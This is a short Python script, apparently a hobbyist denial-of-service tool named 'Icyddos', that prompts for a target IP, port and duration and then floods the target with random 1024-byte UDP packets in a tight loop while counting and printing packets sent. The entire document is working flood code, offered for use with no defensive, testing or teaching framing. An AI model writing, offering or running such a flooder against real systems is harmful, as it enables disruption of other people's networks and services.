import socket, time, random, os, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

ip = input('ENTER IP: ')
port = int(input('ENTER PORT: '))
duration = input('ENTER NUMBER OF SECONDS TO SEND PACKETS: ')

timeout = time.time() + float(duration)
sent = 0
os.system('cls')
print('@copyright Iceyzx, 2022')
print('\n[+] Icyddos starting...')
time.sleep(5)
while True:
	if time.time() > timeout:
		break
	else:
		pass
	sock.sendto(bytes,(ip, port))
	sent = sent + 1
	print("SENT %s PACKETS TO %s THROUGH PORT %s"%(sent, ip, port))
print('')
print(f'{sent} PACKETS ARE SENT TO {ip}')
